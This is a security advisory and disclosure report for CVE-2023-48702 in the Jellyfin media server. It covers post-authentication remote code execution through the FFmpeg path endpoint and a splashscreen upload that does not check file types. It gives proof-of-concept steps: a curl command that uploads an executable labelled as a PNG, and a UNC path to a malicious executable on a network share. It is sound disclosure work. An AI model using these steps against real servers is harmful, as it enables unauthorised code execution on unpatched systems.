# Possible Remote Code Execution via custom FFmpeg binary

Moderate

## Package

No package listed

## Affected versions

<=10.8.12

## Patched versions

10.8.13

## Description

# Possible Remote Code Execution in [/System/MediaEncoder/Path](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) via UNC paths (GHSL-2023-029)

The [/System/MediaEncoder/Path](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) endpoint executes an arbitrary file using ProcessStartInfo via the ValidateVersion function. A malicious administrator can setup a network share and supply a UNC path to [/System/MediaEncoder/Path](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) which points to an executable on the network share, causing Jellyfin server to run the executable in the local context.

```
public bool ValidateVersion()
        {
            string output;
            try
            {
                output = GetProcessOutput(_encoderPath, "-version", false, null);
            }

```

This has been a potential endstep of several other attack vectors, and as such, this endpoint is being removed.

This issue was discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs).

### Severity

### CVE ID

CVE-2023-48702

# GHSL-2023-028: Remote Code Execution in jellyfin - CVE-2023-48702

[![Author avatar](https://avatars.githubusercontent.com/u/11400619)
Kevin Stubbings](https://github.com/Kwstubbs)

## Coordinated Disclosure Timeline

* 2023-02-15 - Report sent to maintainers.
* 2023-05-16 - Jellyfin maintainers respond saying that a fix will be included in v10.9.0.
* 2023-09-12 - Github Security Lab contacts Jellyfin maintainers, asking for a more specific timeline of release v10.9.0, as Jellyfin has been vulnerable for over six months.
* 2023-11-01 - After some disucussion, agreement that Jellyfin maintainers will release a blog post at the same time as Github Security Lab will release an advisory.
* 2023-11-22 - Jellyfin responds saying that the issue will be patched and an advisory published on the release date of [v10.8.13](https://github.com/jellyfin/jellyfin/releases/tag/v10.8.13).

## Summary

A user with administrator permissions is able to run arbitrary code on the jellyfin server via the [/System/MediaEncoder/Path](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) endpoint.

## Product

jellyfin

## Tested Version

[Latest](https://github.com/jellyfin/jellyfin/tree/1c72a8e0068fec8045884fa386a67c90a364ee0a)

## Details

### Issue 1: Remote Code Execution in [`/System/MediaEncoder/Path`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) via UNC paths (`GHSL-2023-029`)

The [`/System/MediaEncoder/Path`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) endpoint executes an arbitrary file using `ProcessStartInfo`via the `ValidateVersion` function. A malicious administrator can setup a network share and supply a UNC path to [`/System/MediaEncoder/Path`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) which points to an executable on the network share, causing jellyfin server to run the executable in the local context.

```
public bool ValidateVersion()
        {
            string output;
            try
            {
                output = GetProcessOutput(_encoderPath, "-version", false, null);
            }

```

This vulnerabilty was found with the help of [CodeQL’s C# Query](https://codeql.github.com/codeql-query-help/csharp/cs-command-line-injection/).

Proof of Concept:

1. Ensure that you are a user that has administration privileges and can access `RequiresElevation` APIs.
2. Go into the jellyfin web front end and set the `Playback -> FFmpeg` path to the path of your executable: `\\IP_ADDRESS\SHARE\MALICIOUS_EXECUTABLE`
3. Click Save. This should send an authenticated request to [`/System/MediaEncoder/Path`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) endpoint and execute your file.
   > Note: I was having some trouble authenticating via curl to the API directly for the [`/System/MediaEncoder/Path`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) so I have suggested using the web-ui instead.

### Issue 2: Insufficient checks on `SplashScreen` file type (`GHSL-2023-028`)

The [`/Branding/Splashscreen`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ImageController.cs#L1764) endpoint does not sufficiently validate file types. It uses the content type specified by the request header to create the extension for the file, but does not check the type of the file itself.

```
	var mimeType = MediaTypeHeaderValue.Parse(Request.ContentType).MediaType;

	if (!mimeType.HasValue)
            {
                return BadRequest("Error reading mimetype from uploaded image");
            }

     var extension = MimeTypes.ToExtension(mimeType.Value);
      if (string.IsNullOrEmpty(extension))
            {
                return BadRequest("Error converting mimetype to an image extension");
            }

      var filePath = Path.Combine(_appPaths.DataPath, "splashscreen-upload" + extension);

```

We can upload an executable by giving a valid content type such as `image/png`. This can be combined with the [`/System/MediaEncoder/Path`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) endpoint in order to achieve Remote Code Execution (RCE).

Proof of Concept:

1. Ensure that you are a user that has administration privileges and can access `RequiresElevation` APIs.
2. Create an executable that you wish to execute on the system and encode it in base64.
3. Run the command `curl -v -H "Content-Type:image/png" -d @base64executable http://localhost:server_port/Branding/Splashscreen?api_key=<YOUR API KEY>` to upload the executable.
4. Go into the jellyfin web front end and set the `Playback -> FFmpeg` path to the path of your executable: `$(_appPaths.DataPath)/splashscreen-upload.png`
5. Click Save. This should send an authenticated request to [`/System/MediaEncoder/Path`](https://github.com/jellyfin/jellyfin/blob/1c72a8e0068fec8045884fa386a67c90a364ee0a/Jellyfin.Api/Controllers/ConfigurationController.cs#L130) endpoint and execute your file.
   > Note: `ProcessStartInfo` ignores the extension given to the splashscreen-upload file and runs the executable.

#### Impact

This issue may lead to post-auth `Remote Code Execution`.
